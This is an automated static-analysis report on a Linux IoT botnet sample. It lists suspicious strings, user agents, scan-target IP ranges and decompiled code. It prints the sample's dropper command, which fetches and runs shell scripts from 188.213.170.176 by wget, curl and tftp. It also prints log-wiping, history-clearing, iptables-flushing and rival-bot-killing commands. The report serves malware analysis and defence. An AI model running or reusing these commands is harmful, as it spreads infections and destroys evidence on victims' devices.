=============================================================================
========	BINARY ID :947a0e7b61278b54c0303807ea1664de122839c6==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :2418
SUPSCPECTED LINES COUNT :217
SUPSCPECTED STRINGS COUNT (DISTINCT) :28
SUPSCPECTED STRINGS WEIGHT :107
SUSPECT STRING SCORE : [107 / 150] 71%
USER AGENTS STRINGS COUNT :62
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :199
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
nopqrstuvwß
)*+%ÉÈPQRSTUVWXYZ
telnet
cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
/proc/cpuinfo
PING
gethostbyname
\e[0;31m[LoveSec] Bruteforced IP: \e[0;33m%s | \e[0;31mUsername: \e[0;33m%s | \e[0;31mPassword: \e[0;33m%s\e[0m
%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00
cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
bin*
bot*
\b/dev/netslink/
/usr/
>%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n
pkill -9 %s\r\n
rm -rf /bin/netstat
pkill -9 busybox
pkill -9 perl
/sbin/iptables -F;/sbin/iptables -X
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
http
\bFailed opening raw socket.
Invalid flag "%s"
GETLOCALIP
BOTKILL
Killing Bots
LOOPING PAYLOAD
TELNET
TELNET ON | OFF
NETIS
[NETIS] SCANNER Starting
HTTP
/proc/net/route
/usr/bin/python
/usr/sbin/dropbear
\e[1;36mWiFi's \e[0;32mPenthouse\e[1;34m Zombie Connected| \e[1;31m%s
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
Unknown host
Host name lookup failure
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/i386/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4203
strstr.c
_string_syserrmsgs.c
error_msg
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
__malloc_largebin_index
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
__socketcall.c
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
__socketcall
waitpid
random
connect
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
hostname_to_ip
__GI_srandom_r
Server_Botport
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
ngPid
strstr
init_rand
rand
StartTheNetis
HackerScan2
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
HackerScan
__GI_inet_pton
gethostbyname
__vfork
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
hekkertelnet
__GI_vfork
NetisRanges
__GI_inet_addr
__libc_connect
pids
sigprocmask
^8PShkJ
xAPPSh 7
PPSh\f
^8PShkJ
^8PShkJ
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
Mozilla/5.0 (PLAYSTATION 3; 3.55)
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
wii libnup/1.0
Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
PSP (PlayStation Portable); 2.00
Bunjalloo/0.7.6(Nintendo DS;U;en)
Doris/1.15 [en] (Symbian)
BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
188.213.170.176
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
history -c
rm -rf ~/.bash_history
history -w
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00
cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 72031
+++TOTAL FUNCTIONS 			:261
+++LINES PER FUNCTION RATIO 	: 275.980842911877
+++SUSPECTED LINES COUNT 	: 2162
+++SUSPECTED LINES RATIO 	: 3.00148547153309
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 72031
+++WHILE (TRUE) LINES			: 15167
+++WHILE (TRUE) LINES RATION		:21.0562119087615%
+++WHILE (TRUE) LOOPS COUNT		: 265
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/"
    char (*v42)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v134, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v134, 0);
                    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v134, 0);
                        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", v134, 0);
    int32_t v133 = __libc_open("/proc/cpuinfo", 0); // 0x8048ea1
    int32_t v133 = __libc_open("/proc/cpuinfo", 0); // 0x804905e
        sprintf(v136, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");
    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"rm -rf /bin/netstat");
                int32_t v139 = __libc_open("/proc/net/route", 0); // 0x8050a44
    int32_t result = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"ROUTER" : (int32_t)"SERVER"; // 0x8050b8d
    char * v128 = "/usr/bin/python"; // bp-5376
    int32_t v129 = access((int32_t)"/usr/bin/python", 0) == -1 ? (int32_t)"/usr/sbin/dropbear" : (int32_t)"sshd";
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    if (__libc_open("/dev/null", v135) != v133) {
    int32_t v134 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v133); // 0x805643d
    int32_t v147 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v133); // 0x805645b
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(a1, (char *)a2, 0, -1);
int32_t _stdio_fopen(int32_t a1, char * a2, int32_t a3, int32_t a4) {
    int32_t v133 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v132); // 0x805784d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v132);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",

    char (*v40)[16] = "188.213.170.176";

    char (*v42)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";

        szprintf(v144, (int32_t)"112.5.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v145, (int32_t)"117.165.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v146, (int32_t)"85.3.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v147, (int32_t)"37.158.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v148, (int32_t)"95.9.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v149, (int32_t)"41.252.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v150, (int32_t)"58.71.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v151, (int32_t)"104.55.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v152, (int32_t)"78.186.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v153, (int32_t)"78.189.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v154, (int32_t)"221.120.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v155, (int32_t)"88.5.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v156, (int32_t)"41.254.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v157, (int32_t)"103.20.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v158, (int32_t)"103.47.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v159, (int32_t)"103.57.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v160, (int32_t)"45.117.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v161, (int32_t)"101.51.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v162, (int32_t)"137.59.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v163, (int32_t)"1.56.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v164, (int32_t)"1.188.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v165, (int32_t)"14.204.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v166, (int32_t)"27.0.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v167, (int32_t)"27.8.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v168, (int32_t)"27.50.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v169, (int32_t)"27.54.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v170, (int32_t)"27.98.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v171, (int32_t)"27.112.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v172, (int32_t)"27.192.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v173, (int32_t)"36.32.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v174, (int32_t)"36.248.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v175, (int32_t)"39.64.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v176, (int32_t)"42.4.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v177, (int32_t)"42.48.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v178, (int32_t)"42.52.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v179, (int32_t)"42.56.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v180, (int32_t)"42.63.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v181, (int32_t)"42.84.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v182, (int32_t)"42.176.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v183, (int32_t)"42.224.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v184, (int32_t)"42.176.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v185, (int32_t)"43.253.%d.%d", (int32_t)v131, (int32_t)v132);

        szprintf(v186, (int32_t)"43.230.%d.%d", (int32_t)v131, (int32_t)v132);

